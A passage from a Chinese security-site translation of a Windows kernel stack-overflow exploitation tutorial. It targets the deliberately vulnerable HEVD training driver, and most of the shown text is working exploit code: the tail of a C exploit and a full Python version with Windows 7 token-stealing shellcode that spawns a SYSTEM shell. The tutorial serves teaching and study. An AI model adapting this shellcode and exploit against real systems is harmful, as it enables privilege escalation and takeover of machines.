+&nbsp;&nbsp;&nbsp;&nbsp;si.cb&nbsp;=&nbsp;sizeof&nbsp;si;
+&nbsp;&nbsp;&nbsp;&nbsp;ZeroMemory(&amp;pi,&nbsp;sizeof&nbsp;pi);
+&nbsp;&nbsp;&nbsp;&nbsp;IsUserAnAdmin()&nbsp;?
+&nbsp;&nbsp;&nbsp;&nbsp;CreateProcess(
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;L&quot;C:\\Windows\\System32\\cmd.exe&quot;,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;L&quot;/T:17&quot;,&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NULL,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NULL,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CREATE_NEW_CONSOLE,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NULL,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NULL,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(STARTUPINFO&nbsp;*)&amp;si,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(PROCESS_INFORMATION&nbsp;*)&amp;pi)&nbsp;:
+&nbsp;&nbsp;&nbsp;&nbsp;wprintf(L&quot;[!]&nbsp;Exploit&nbsp;Failed!&quot;);
+&nbsp;&nbsp;&nbsp;&nbsp;HeapFree(GetProcessHeap(),&nbsp;0,&nbsp;(LPVOID)lpInBuffer);
+&nbsp;&nbsp;&nbsp;&nbsp;CloseHandle(hDevice);
+&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;0;
+}
+//EOF</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Python版</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">#&nbsp;https://github.com/OsandaMalith/Exploits/blob/master/HEVD/StackOverflowx86.py
+import&nbsp;os&nbsp;
+import&nbsp;sys
+import&nbsp;struct
+from&nbsp;ctypes&nbsp;import&nbsp;*
+from&nbsp;ctypes.wintypes&nbsp;import&nbsp;*
+kernel32&nbsp;=&nbsp;windll.kernel32
+def&nbsp;TokenStealingPayloadWin7():
+&nbsp;&nbsp;&nbsp;&nbsp;shellcode&nbsp;=&nbsp;(
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#---[Setup]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x60&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;pushad
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x64\xA1\x24\x01\x00\x00&quot;&nbsp;&nbsp;#&nbsp;mov&nbsp;eax,&nbsp;fs:[KTHREAD_OFFSET]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x8B\x40\x50&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;mov&nbsp;eax,&nbsp;[eax&nbsp;+&nbsp;EPROCESS_OFFSET]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x89\xC1&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;mov&nbsp;ecx,&nbsp;eax&nbsp;(Current&nbsp;_EPROCESS&nbsp;structure)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x8B\x98\xF8\x00\x00\x00&quot;&nbsp;&nbsp;#&nbsp;mov&nbsp;ebx,&nbsp;[eax&nbsp;+&nbsp;TOKEN_OFFSET]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#---[Copy&nbsp;System&nbsp;PID&nbsp;token]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\xBA\x04\x00\x00\x00&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;mov&nbsp;edx,&nbsp;4&nbsp;(SYSTEM&nbsp;PID)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x8B\x80\xB8\x00\x00\x00&quot;&nbsp;&nbsp;#&nbsp;mov&nbsp;eax,&nbsp;[eax&nbsp;+&nbsp;FLINK_OFFSET]&nbsp;&lt;-|
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x2D\xB8\x00\x00\x00&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;sub&nbsp;eax,&nbsp;FLINK_OFFSET&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x39\x90\xB4\x00\x00\x00&quot;&nbsp;&nbsp;#&nbsp;cmp&nbsp;[eax&nbsp;+&nbsp;PID_OFFSET],&nbsp;edx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x75\xED&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;jnz&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&gt;|
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x8B\x90\xF8\x00\x00\x00&quot;&nbsp;&nbsp;#&nbsp;mov&nbsp;edx,&nbsp;[eax&nbsp;+&nbsp;TOKEN_OFFSET]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x89\x91\xF8\x00\x00\x00&quot;&nbsp;&nbsp;#&nbsp;mov&nbsp;[ecx&nbsp;+&nbsp;TOKEN_OFFSET],&nbsp;edx
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#---[Recover]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x61&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;popad
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x31\xC0&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;NTSTATUS&nbsp;-&gt;&nbsp;STATUS_SUCCESS
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x5D&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;pop&nbsp;ebp
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\xC2\x08\x00&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;ret&nbsp;8
+&nbsp;&nbsp;&nbsp;&nbsp;)
+&nbsp;&nbsp;&nbsp;&nbsp;shellcodePtr&nbsp;=&nbsp;id(shellcode)&nbsp;+&nbsp;20
+&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;shellcodePtr
+def&nbsp;main():
+&nbsp;&nbsp;&nbsp;&nbsp;lpBytesReturned&nbsp;=&nbsp;c_ulong()
+&nbsp;&nbsp;&nbsp;&nbsp;hDevice&nbsp;=&nbsp;kernel32.CreateFileA(&quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;,&nbsp;0xC0000000,0,&nbsp;None,&nbsp;0x3,&nbsp;0,&nbsp;None)
+&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;not&nbsp;hDevice&nbsp;or&nbsp;hDevice&nbsp;==&nbsp;-1:
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;[!]&nbsp;Failed&nbsp;to&nbsp;get&nbsp;a&nbsp;handle&nbsp;to&nbsp;the&nbsp;driver&nbsp;&quot;&nbsp;+&nbsp;str(ctypes.GetLastError())
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;-1
+&nbsp;&nbsp;&nbsp;&nbsp;buf&nbsp;=&nbsp;&quot;\x41&quot;&nbsp;*&nbsp;2080&nbsp;+&nbsp;struct.pack(&quot;&lt;L&quot;,TokenStealingPayloadWin7())
+&nbsp;&nbsp;&nbsp;&nbsp;bufSize&nbsp;&nbsp;=&nbsp;len(buf)
+&nbsp;&nbsp;&nbsp;&nbsp;bufPtr&nbsp;=&nbsp;id(buf)&nbsp;+&nbsp;20
+&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;[+]&nbsp;Sending&nbsp;IOCTL&nbsp;request&nbsp;&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;kernel32.DeviceIoControl(hDevice,&nbsp;0x222003,&nbsp;bufPtr,&nbsp;bufSize,&nbsp;None,&nbsp;0,byref(lpBytesReturned)&nbsp;&nbsp;&nbsp;,&nbsp;None)
+&nbsp;&nbsp;&nbsp;&nbsp;os.system(&#39;cmd.exe&#39;)
+if&nbsp;__name__&nbsp;==&nbsp;&#39;__main__&#39;:
+&nbsp;&nbsp;&nbsp;&nbsp;main()
+#&nbsp;EOF</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这里获取到了Root权限</span></p><p style="text-align:center"><img src="http://p4.qhimg.com/t01a5e1ce064c890aba.png" title="t016e0a274d93bcc194.png" alt="http://p7.qhimg.com/t016e0a274d93bcc194.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">如果我们检查该过程，您可以看到它作为NT AUTHORITY / SYSTEM运行。</span></p><p style="text-align: center;"><img src="http://p5.qhimg.com/t01c0b57e87cf779378.png" title="t01007c95a37510c367.png" alt="http://p0.qhimg.com/t01007c95a37510c367.png"/></p></p>
+                <hr/>
+                <p style="text-align: center;">
+                    <img src="http://bobao.360.cn/img/app.jpeg"/>
+                    <img src="http://bobao.360.cn/img/weixin.jpeg"/>
+                </p>
+                                <p>本文由 安全客 翻译，转载请注明“转自安全客”，并附上链接。<br/><a class="text-more" href="https://osandamalith.com/2017/04/05/windows-kernel-exploitation-stack-overflow/" target="_blank">原文链接：https://osandamalith.com/2017/04/05/windows-kernel-exploitation-stack-overflow/</a></p>
+                            </div>
+            <div style="margin-top: 20px;background-color:#FFFFFF">
+    <input type="hidden" id="detail_title" name="detail_title" value="【技术分享】Windows 内核攻击：栈溢出 - 安全客 - 有思想的安全新媒体" />
+    <input type="hidden" id="use_nickname" name="use_nickname" value="0" />
+    <a name="mao"></a>
+    <div class="reg-log mobile-hiden">
+        <div class="" id="userTo">   
+            <div id="to-list" class="input-text" style="">
+                <textarea disabled="disabled" class="hide"  id="comment-content" to="to"></textarea>
+                <ul id="preadded" style="display:none">       
+                </ul>
+                <div id="to-auto" style="width: 200px">
+                    <ul id="feed">
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <input type="hidden" id="source-id" value="3712" />
+        <input type="hidden" id="source-type" value="learning" />
+        <input type="hidden" id="post-comment-url" value="/comment/add" />
+        <input type="hidden" id="post-nickname-url-ajax" value="/comment/randnicknameajax" />
+        <input type="hidden" id="post-check-login-url-ajax" value="/comment/checklogin" />
+        <input type="hidden" id="stoken_comment_set" value="ea3898fb4df38673fdeb61c458234054">                 <span class="join">参与讨论，请先 <a href="javascript:;" class="comment-login">登录</a> | <a href="javascript:;" class="comment-reg">注册</a> |  <a href="javascript:;" class="anonymous-comment">匿名评论</a></span>
+            </div>
+    <div class="mobile-hide" style="width: 870px; margin: 0 auto;">
+        <label style="vertical-align:middle;" for="use_nickname">匿名</label> 
+        <input style="vertical-align:middle;" id="trigger-nickname" name="use_nickname" class="use_nickname" type="checkbox" value="0" />
+
+        <a href="javascript:;" class="apply-use button" id="submit-comment" data-target="/comment/add">发布</a>
+    </div>
+
+
+    <div class="clearfix"></div>
+    <div class="comments">
+        <div class="comments-head">
+            <span class="title">用户评论</span>
+        </div>
+                <div class="comment-none alarm-info bg-primary">无任何评论</div>
+            </div>
+</div>
+<script>
+    $(function () {
+        $('.anonymous-comment').click(function () {
+            $(".join").hide();
+            $(".reg-log textarea").first().removeAttr("disabled").show();
+            $('#use_nickname').val('1');
+//            $('#trigger-nickname').attr('checked', true);
+            $('#trigger-nickname').trigger('click');
+        });
+        //为所有复选框绑定事件
+//        checkbox_on_click();
+        //ajax随机获取昵称
+//        randnicknameajax(0);
+        //ajax检测登录状态
+        comment_check_login();
+    });
+
+
+
+    function input_checkbox(flag) {
+        $('input:checkbox').each(function () {
+            var value = flag ? 1 : 0;
+            $(this).prop('checked', flag);
+            $(this).val(value);
+        });
+    }
+
+//ajax随机获取昵称
+    function randnicknameajax(flag) {
+        $.ajax({
+            type: 'POST',
+            url: $('#post-nickname-url-ajax').val(),
+            data: {limit: 1, flag: flag},
+            dataType: "json",
+            success: function (data) {
+                $('#nick-name').val(data.data[0]);
+                _nick_name=data.data[0];
+            }
+        });
+    }
+    $();
+//ajax检测登录状态
+    function comment_check_login() {
+        $.ajax({
+            type: 'POST',
+            url: $('#post-check-login-url-ajax').val(),
+            data: {},
+            dataType: "json",
+            success: function (data) {
+                if (data.success) {
+                    $('.join').hide();
+                    $(".reg-log textarea").first().removeAttr("disabled").show();
+                    $("#span_use_nickname").show();
+                    $('#use_nickname').val('0');
+                    $('#use_nickname').attr('checked', false);
+                }
+            }
+        });
+    }
+</script>        </div>
+    </div>
+    <div class="side-bar">
+        <div class="mod hot-news">
+    <div class="head-bar clearfix">
+        <h2><i class="icon icon-hot"></i><span>热门知识</span></h2>
+    </div>
+    <ul class="links-list">
+                                <li><a href="/learning/detail/4411.html" alt="【漏洞预警】一个换行符引发的奥斯卡0day漏洞(CVE-2017-8759)重现——最新的Office高级威胁攻击预警" target="_blank">【漏洞预警】一个换行符引发的奥斯卡...</a></li>
+                                <li><a href="/learning/detail/4416.html" alt="【漏洞预警】Microsoft .NET Framework漏洞（CVE–2017–8759）预警" target="_blank">【漏洞预警】Microsoft .NE...</a></li>
+                                <li><a href="/learning/detail/4414.html" alt="【技术分享】妙用JavaScript绕过XSS过滤" target="_blank">【技术分享】妙用JavaScrip...</a></li>
+                                <li><a href="/learning/detail/4418.html" alt="【技术分享】利用威胁情报数据平台拓展APT攻击线索一例" target="_blank">【技术分享】利用威胁情报数据平台拓...</a></li>
+                                <li><a href="/learning/detail/4417.html" alt="【知识】9月15日 - 每日安全知识热点" target="_blank">【知识】9月15日 - 每日安全知识热...</a></li>
+                                <li><a href="/learning/detail/4425.html" alt="【安全报告】XShellGhost事件技术回顾报告" target="_blank">【安全报告】XShellGhost事件...</a></li>
+            </ul>
+</div>        <!-- 友情链接 -->
+        <div class="mod blog-links mobile-hide">
+    <div class="head-bar clearfix">
+        <h2><i class="icon icon-link"></i><span>友情链接</span></h2>
+        <a href="/links/index.html" class="more">更多<i></i></a>
+    </div>
+        <ul class="links-list">
+                <li><a href="http://bbs.360safe.com" alt="360安全社区" target="_blank">360安全社区</a></li>
+                <li><a href="http://zhuji.360.cn" alt="360主机卫士" target="_blank">360主机卫士</a></li>
+                <li><a href="http://blogs.360.cn/" alt="奇虎360技术博客" target="_blank">奇虎360技术博客</a></li>
+                <li><a href="http://wangzhan.360.cn/" alt="360网站卫士" target="_blank">360网站卫士</a></li>
+                <li><a href="http://webscan.360.cn/" alt="360网站安全检测" target="_blank">360网站安全检测</a></li>
+                <li><a href="http://research.360.cn/report/" alt="360研究报告" target="_blank">360研究报告</a></li>
+                <li><a href="http://unicorn.360.cn/" alt="360 Unicorn Team" target="_blank">360 Unicorn Team</a></li>
+                <li><a href="http://appscan.360.cn/" alt="360捉虫猎手" target="_blank">360捉虫猎手</a></li>
+                <li><a href="https://threathunter.org/" alt="ThreatHunter社区" target="_blank">ThreatHunter社区</a></li>
+                <li><a href="http://security.360.cn/" alt="360安全应急响应中心" target="_blank">360安全应急响应中心</a></li>
+            </ul>
+    </div>
+        <!-- 联系我们 -->
+        <div class="mod contact mobile-hide" style="text-align:center">
+    <div class="head-bar clearfix">
+        <h2><i></i><span>关注我们</span></h2>
+    </div>
+    <!-- 微信关注 -->
+    <ul class="contact-way">
+        <li><a>微信关注</a></li>
+    </ul>
+    <div style="padding-left:20px;padding-bottom:15px;">
+    <img src="/img/qrcode_adlab_weixin.png?v=1.1"  width="145px" height="145px;"/>
+    </div>
+    
+    <!-- APP下载 -->
+    <ul class="contact-way">
+        <li><a>安全播报APP</a></li>
+    </ul>
+    <div style="padding-left:20px;padding-bottom:15px;">
+    <img src="/img/scan_code_big.png?v=1.1"  width="145px" height="145px;"/>
+    </div>
+    
+</div>
+
+    </div>
+</div>
+
+<script type="text/javascript" src="/js/jquery-ui.min.js?v=3.0"></script>
+<script type="text/javascript" src="/js/jquery.noty.packaged.min.js?v=3.0"></script>
+<script type="text/javascript" src="/js/common.js?v=4.5"></script>
+<script>$(function() {sync_count('comment');});</script>
+
+
+<!-- 语法高亮 -->
+<script type="text/javascript" src="/ue/SyntaxHighlighter/shCore.js"></script>
+<script type="text/javascript">SyntaxHighlighter.all();sync_count('vul');sync_count('news');sync_count('learning');sync_count('activity');sync_count('course');sync_count('ctf');</script>
+    </div>
+
+        <div class="footer">
+        <div class="friend-link">
+            <a href="http://www.360.cn/" target="_blank">360首页</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">关于我们</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">联系我们</a>
+            <span>|</span>
+            <a href="/links/index.html" target="_blank">友情链接</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">招贤纳士</a>
+        </div>
+        <div class="copy">
+            Copyright &copy; 360网络攻防实验室 All Rights Reserved <span class="copy_icp">京ICP证080047号[京ICP备08010314号-6]</span>
+        </div>
+    </div>
+    
+</div>
+
+<!--奇舞团统计-->
+
+<script src='https://s.ssl.qhimg.com/static/f5407c785655e6a1/monitor_analytic.js'></script>
+<script>
+    monitor.setProject('QH_171_1').getTrack().getClickAndKeydown().getClickHeatmap(10, 1);
+</script>
+
+<div class="hide">
+    <script src="https://s95.cnzz.com/z_stat.php?id=1253147824&web_id=1253147824" language="JavaScript"></script>
+</div>
+<div class="backToTop_wrap off">
+    <a id="back_to_top" class="backToTop" href="javascript:;" title="返回顶部"></a>
+</div>
+<script>
+    var $backToTop_wrap = $(".backToTop_wrap"),
+        $backToTop_btn = $("#back_to_top");
+
+    if ($(window).scrollTop() > 100) {
+        $backToTop_wrap.removeClass("off");
+    }
+    else {
+        $backToTop_wrap.addClass("off");
+    }
+
+    $(window).on("scroll", function () {
+        if ($(this).scrollTop() > 100) {
+            $backToTop_wrap.removeClass("off");
+        }
+        else {
+            $backToTop_wrap.addClass("off");
+        }
+    });
+
+    $backToTop_btn.on("click", function () {
+        $("html, body").animate({scrollTop: 0}, 120);
+    });
+
+    $(function () {
+        var navlist = $('.nav-list > li');
+
+        navlist.each(function () {
+            $(this).on('mouseenter', function () {
+                $(this).addClass('selected');
+            });
+
+            $(this).on('mouseleave', function () {
+                $(this).removeClass('selected');
+            });
+        });
+    })
+</script>
+
+
+
+</body>
+</html>
